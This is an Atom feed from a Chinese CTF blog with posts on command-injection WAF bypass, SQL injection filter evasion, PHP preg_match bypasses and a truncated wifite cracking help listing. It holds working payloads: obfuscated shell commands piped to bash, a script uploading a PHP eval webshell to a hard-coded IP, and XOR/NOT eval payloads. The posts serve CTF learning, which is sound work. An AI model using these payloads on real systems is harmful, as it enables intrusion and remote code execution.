<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>li-yian</title>
  
  <subtitle>分享知识，认识世界</subtitle>
  <link href="http://li-yian.site/atom.xml" rel="self"/>
  
  <link href="http://li-yian.site/"/>
  <updated>2024-02-01T14:47:47.584Z</updated>
  <id>http://li-yian.site/</id>
  
  <author>
    <name>刘凯</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCE-WAF绕过</title>
    <link href="http://li-yian.site/2024/02/01/rce-waf%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <id>http://li-yian.site/2024/02/01/rce-waf%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</id>
    <published>2024-01-31T16:00:00.000Z</published>
    <updated>2024-02-01T14:47:47.584Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCE-WAF绕过"><a href="#RCE-WAF绕过" class="headerlink" title="RCE-WAF绕过"></a>RCE-WAF绕过</h1><p>WAF绕过的目标是绕过WAF的规则和过滤器，使攻击可以成功地通过WAF并达到预期的攻击效果。以下是一些常见的WAF绕过技术：</p><ol><li>编码绕过：通过对攻击负载进行编码或混淆，以绕过WAF的特征匹配。例如，使用URL编码、Unicode编码、Base64编码等对攻击载荷进行编码，以使其在WAF检测时无法被正确识别。</li><li>分割绕过：将攻击负载拆分为多个部分，以绕过WAF的完整性检查。例如，将SQL注入语句的关键字拆分为多个部分，或将恶意代码分散在多个HTTP请求中，以避免被WAF完全检测到。</li><li>混合绕过：结合多个绕过技术，以增加绕过成功的可能性。例如，将编码和分割技术结合使用，同时使用多个编码方式对攻击负载进行混淆。</li><li>特殊字符绕过：利用一些特殊字符或Unicode字符的变形来绕过WAF的规则。例如，使用不同大小写的字符、宽字符、特殊字符的变形等。</li><li>HTTP方法绕过：尝试使用非标准的HTTP方法来绕过WAF的规则。例如，使用PROPFIND、OPTIONS等非常见的HTTP方法进行攻击。</li><li>隧道绕过：通过将攻击负载封装在其他协议或通信通道中，以绕过WAF的检测。例如，使用HTTP隧道技术将攻击负载伪装成合法的HTTP流量。</li></ol><h2 id="1，空格绕过"><a href="#1，空格绕过" class="headerlink" title="1，空格绕过"></a>1，空格绕过</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure><h2 id="2，变量拼接方法"><a href="#2，变量拼接方法" class="headerlink" title="2，变量拼接方法"></a>2，变量拼接方法</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种方法还是非常常见的，就是通过拆分和拼接的方式，可以绕过对命令和对文件名的正则匹配，达到执行命令的目的</span><br><span class="line">但这种方式有很大的弊端就是当分号被过滤掉之后就很难使用了：</span><br><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure><h2 id="3，编码绕过"><a href="#3，编码绕过" class="headerlink" title="3，编码绕过"></a>3，编码绕过</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种方法网上写的非常多，但我觉得实际能用的情况其实挺少的，而且构造它也相对比较麻烦，这里就简单推荐两种方法：</span><br><span class="line">1.base64</span><br><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造cat /flag为：</span><br><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d` /flag</span><br><span class="line">2.hex</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash </span><br><span class="line">其中77686F616D69是whoami的hex编码</span><br></pre></td></tr></table></figure><h2 id="4，通配符绕过"><a href="#4，通配符绕过" class="headerlink" title="4，通配符绕过"></a>4，通配符绕过</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这种方式主要是针对文件名那几个字符被过滤时可以使用，就是用?或者*来代替具体的字符</span><br><span class="line">但一定注意这是针对文件名的哈，命令是肯定不能直接这么用的，但linux下命令其实也是文件</span><br><span class="line">比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</span><br><span class="line">ls -&gt; /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line">像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br></pre></td></tr></table></figure><h2 id="5，内联注入"><a href="#5，内联注入" class="headerlink" title="5，内联注入"></a>5，内联注入</h2><p>使用内联（就是将反引号内命令的输出作为输入执行）</p><p><img src="https://img-blog.csdnimg.cn/20210720212504258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ3NzQ1NzYy,size_16,color_FFFFFF,t_70"></p><h2 id="6，管道搭配注入"><a href="#6，管道搭配注入" class="headerlink" title="6，管道搭配注入"></a>6，管道搭配注入</h2><p>在Linux中，<code>bash</code>和<code>sh</code>都是Shell解释器。Shell是一种命令行解释器，允许用户与操作系统交互。<code>bash</code>（Bourne Again SHell）是默认的Shell解释器，广泛用于Linux系统。而<code>sh</code>（Bourne Shell）是一种更简单的Shell解释器，也常被用作脚本的解释器。</p><p>管道（<code>|</code>）是一种用于将一个命令的输出作为另一个命令的输入的特殊符号。通过使用管道，可以将多个命令链接在一起，实现更复杂的操作。</p><p>以下是一个示例，展示了如何使用<code>bash</code>和<code>sh</code>与管道（<code>|</code>）搭配使用：</p><p>假设我们有一个名为<code>file.txt</code>的文本文件，其中包含一些文本行。我们想要统计该文件中包含特定字符串的行数。</p><p>使用<code>bash</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file.txt | grep <span class="string">&quot;specific string&quot;</span> | <span class="built_in">wc</span> -l</span></span><br></pre></td></tr></table></figure><p>这个命令会将<code>file.txt</code>的内容传递给<code>grep</code>命令，<code>grep</code>命令会过滤出包含”specific string”的行，然后将结果传递给<code>wc -l</code>命令，<code>wc -l</code>命令会计算行数并输出结果。</p><p>使用<code>sh</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file.txt | grep <span class="string">&quot;specific string&quot;</span> | <span class="built_in">wc</span> -l</span></span><br></pre></td></tr></table></figure><p>与<code>bash</code>相同，这个命令也会将<code>file.txt</code>的内容传递给<code>grep</code>命令，<code>grep</code>命令会过滤出包含”specific string”的行，然后将结果传递给<code>wc -l</code>命令，<code>wc -l</code>命令会计算行数并输出结果。</p><p>无论是<code>bash</code>还是<code>sh</code>，管道都是一种非常有用的工具，可以将多个命令组合在一起，实现更复杂的操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;cHJpbnQgJy92YXIvc3lzL2Jpbi9iYXNoIHNjaGVtZXMvaW5jbHVkaW5nLmJpbicK&quot;</span> | <span class="built_in">base64</span> -d | bash</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入做题经验</title>
    <link href="http://li-yian.site/2024/01/20/SQL%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/"/>
    <id>http://li-yian.site/2024/01/20/SQL%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/</id>
    <published>2024-01-19T16:00:00.000Z</published>
    <updated>2024-02-01T14:45:19.960Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL注入做题经验"><a href="#SQL注入做题经验" class="headerlink" title="SQL注入做题经验"></a>SQL注入做题经验</h1><p>1，[极客大挑战 2019]BabySQL</p><p>特点：这个题目过滤了过滤了好多关键字，比如or, select,where, union。应该是用函数replace给我们替换成了空白字符</p><p>解决：构造oorr，sselectelect，类似的词语绕过过滤。</p><p>双写绕过，编码绕过（#：%23）</p><p>在某些情况下，系统可能会对用户输入进行一些过滤或验证来防止恶意输入或攻击。其中一种常见的过滤方式是对特定字符进行转义或URL编码。</p><p>在你提供的例子中，输入的字符 “#” 被转义为 “%23”。这样做的好处是可以绕过一些简单的过滤机制，因为对于这些过滤机制来说，”%23” 不会被解析为 “#” 字符。</p><p>对于一些简单的应用程序，开发者可能只检查是否存在 “union” 和 “select” 这样的关键词，而忽略了其他特殊字符。通过使用转义字符或URL编码，攻击者可以欺骗这些简单的过滤机制，绕过它们的检查。</p><p>然而，这并不是一种可靠的方式来进行攻击，因为更强大的过滤和安全策略可以检测和阻止这种类型的注入攻击。更重要的是，使用转义字符或URL编码来绕过过滤机制是不被推荐的，因为它并不安全，并且可能会导致其他问题。</p><p>作为开发者或系统管理员，最好的做法是采用更强大的防护措施，如输入验证、参数化查询和安全编码实践，以防止SQL注入攻击。</p><p>对于一些简单的过滤机制，攻击者可能使用一些绕过方法来欺骗它们。以下是一些常见的绕过漏洞和方法：</p><ol><li>双写绕过：攻击者可以使用双写绕过来绕过一些简单的过滤机制。例如，如果某个过滤检查是否存在 “union” 字符串，攻击者可以使用 “ununionion” 来绕过，因为过滤机制只会检查连续的字符，而不会检查双写字符。</li><li>编码绕过：攻击者可以使用编码来绕过过滤机制。例如，攻击者可以使用 URL 编码或 HTML 实体编码来表示特殊字符，以绕过过滤器的检查。例如，”#” 字符可以被表示为 “%23” 或 “#”。</li><li>混淆绕过：攻击者可以使用字符混淆来绕过过滤机制。例如，攻击者可以使用特殊字符的变体或替代字符，如全角字符、大小写混合、空格等，来绕过过滤器的检查。</li><li>组合绕过：攻击者可以将多个绕过技巧结合起来，以增加成功绕过过滤机制的机会。例如，攻击者可以使用双写字符和编码字符的组合来构造恶意输入。</li></ol><p>然而，需要注意的是，这些绕过方法只适用于一些简单的过滤机制。对于更强大的防护措施和安全策略，这些方法可能无效。因此，最佳实践是采用更安全和可靠的防护措施，如输入验证、参数化查询、安全编码实践和使用成熟的安全框架&#x2F;库。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>preg_match 函数绕过</title>
    <link href="http://li-yian.site/2024/01/20/preg_match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>http://li-yian.site/2024/01/20/preg_match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2024-01-19T16:00:00.000Z</published>
    <updated>2024-02-01T14:44:37.268Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="preg-match绕过总结"><a href="#preg-match绕过总结" class="headerlink" title="preg_match绕过总结"></a>preg_match绕过总结</h1><p>函数简介：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">returns <span class="number">1</span>; <span class="comment">// 如果匹配到. </span></span><br><span class="line">returns <span class="number">0</span>; <span class="comment">// 如果未匹配到. </span></span><br><span class="line">returns <span class="literal">FALSE</span>; <span class="comment">// 发生错误时.</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><h2 id="1，数组绕过"><a href="#1，数组绕过" class="headerlink" title="1，数组绕过"></a>1，数组绕过</h2><p>原理：</p><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h2 id="2，PHP利用PCRE回溯流量限制绕过某些安全限制"><a href="#2，PHP利用PCRE回溯流量限制绕过某些安全限制" class="headerlink" title="2，PHP利用PCRE回溯流量限制绕过某些安全限制"></a>2，PHP利用PCRE回溯流量限制绕过某些安全限制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure><p>Payload:?a&#x3D;ssss………..省略n个字符，突破100万</p><h2 id="3，换行符绕过-0a"><a href="#3，换行符绕过-0a" class="headerlink" title="3，换行符绕过(%0a)"></a>3，换行符绕过(%0a)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/i&#x27;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c&#x3D;flag%0a 即可绕过</p><p>注意此时正则表达式的模式是: i</p><h2 id="4，-5c绕过"><a href="#4，-5c绕过" class="headerlink" title="4，%5c绕过"></a>4，%5c绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); <span class="variable">$key</span> = <span class="string">&quot;bad&quot;</span>; <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);        </span><br><span class="line"><span class="comment">// 使用POST接收参数 </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> === <span class="string">&#x27;bad&#x27;</span>)&#123;        </span><br><span class="line"><span class="comment">// $key 与 &#x27;bad&#x27; 进行比较，值不相同时才可以继续运行代码    </span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;badbad!!!&#x27;</span>); &#125; </span><br><span class="line"><span class="variable">$act</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;act&#x27;</span>];    </span><br><span class="line"><span class="comment">// 获得 act 参数 </span></span><br><span class="line"><span class="variable">$arg</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];    </span><br><span class="line"><span class="comment">// 获得 arg 参数 </span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)) </span><br><span class="line">&#123;    <span class="comment">// 针对act参数进行过滤    echo &#x27;check&#x27;; &#125; </span></span><br><span class="line"><span class="keyword">else</span> &#123;    <span class="variable">$act</span>(<span class="variable">$arg</span>,<span class="string">&#x27;&#x27;</span>);        <span class="comment">// 动态调用 &#125; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;666&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/i不区分大小写</span><br><span class="line"></span><br><span class="line">/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line">/D如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure><p>这里存在&#x2F;s和&#x2F;D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h2 id="5，preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#5，preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="5，preg_match(“&#x2F;^$&#x2F;e”) (注：php版本需要小于5.5.0)"></a>5，preg_match(“&#x2F;^$&#x2F;e”) (注：php版本需要小于5.5.0)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload&#x3D;xx?h&#x3D;phpinfo();</p><h2 id="6，异或绕过"><a href="#6，异或绕过" class="headerlink" title="6，异或绕过"></a>6，异或绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">        a = <span class="built_in">ord</span>(<span class="built_in">str</span>[i])^<span class="built_in">ord</span>(<span class="built_in">str</span>[j])</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>[i] + <span class="string">&#x27; ^ &#x27;</span> + <span class="built_in">str</span>[j] + <span class="string">&#x27; is &#x27;</span> + <span class="built_in">chr</span>(a))</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]();&amp;_=phpinfo</span><br></pre></td></tr></table></figure><h2 id="7，取反绕过"><a href="#7，取反绕过" class="headerlink" title="7，取反绕过"></a>7，取反绕过</h2><p>把getFlag取反然后URL编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;getFlag&quot;</span>); </span><br></pre></td></tr></table></figure><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=~%<span class="number">98</span>%<span class="number">9</span>A%<span class="number">8</span>B%B9%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>wifite使用命令</title>
    <link href="http://li-yian.site/2024/01/20/wifite%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://li-yian.site/2024/01/20/wifite%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2024-01-19T16:00:00.000Z</published>
    <updated>2024-02-01T14:45:44.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="wifite使用命令"><a href="#wifite使用命令" class="headerlink" title="wifite使用命令"></a>wifite使用命令</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Copy code</span><br><span class="line">wifite</span><br><span class="line"></span><br><span class="line">root@kali:~# wifite -h</span><br><span class="line"></span><br><span class="line">  .;&#x27;                     `;,</span><br><span class="line"> .;&#x27;  ,;&#x27;             `;,  `;,   WiFite v2 (r85)</span><br><span class="line">.;&#x27;  ,;&#x27;  ,;&#x27;     `;,  `;,  `;,</span><br><span class="line">::   ::   :   ( )   :   ::   ::  automated wireless auditor</span><br><span class="line">&#x27;:.  &#x27;:.  &#x27;:. /_\ ,:&#x27;  ,:&#x27;  ,:&#x27;</span><br><span class="line"> &#x27;:.  &#x27;:.    /___\    ,:&#x27;  ,:&#x27;   designed for Linux</span><br><span class="line">  &#x27;:.       /_____\      ,:&#x27;</span><br><span class="line">           /       \</span><br><span class="line"></span><br><span class="line">   命令</span><br><span class="line">    -check &lt;file&gt;   检查capfile &lt;文件&gt;进行握手。</span><br><span class="line">    -cracked        显示以前破解的接入点</span><br><span class="line"></span><br><span class="line">   GLOBAL </span><br><span class="line">    -all            攻击所有目标.                        [off]</span><br><span class="line">    -i &lt;iface&gt;      用于捕获的无线接口                   [auto]</span><br><span class="line">    -mac            匿名mac地址                          [off]</span><br><span class="line">    -c &lt;channel&gt;    频道扫描目标                         [auto]</span><br><span class="line">    -e &lt;essid&gt;      通过ssid定位特定的接入点 (name)      [ask]</span><br><span class="line">    -b &lt;bssid&gt;      通过bssid定位一个特定的接入点 (mac)  [auto]</span><br><span class="line">    -showb          扫描后显示目标BSSID                  [off]</span><br><span class="line">    -pow &lt;db&gt;       用信号强度攻击任何目标          &gt; db [0]</span><br><span class="line">    -quiet          扫描期间不要打印AP列表               [off]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   WPA</span><br><span class="line">    -wpa            仅针对WPA网络 (works with -wps -wep)   [off]</span><br><span class="line">    -wpat &lt;sec&gt;     等待WPA攻击完成的时间 (seconds)        [500]</span><br><span class="line">    -wpadt &lt;sec&gt;    发送deauth数据包之间等待的时间 (sec)   [10]</span><br><span class="line">    -strip          使用tshark或pyrit进行握手              [off]</span><br><span class="line">    -crack 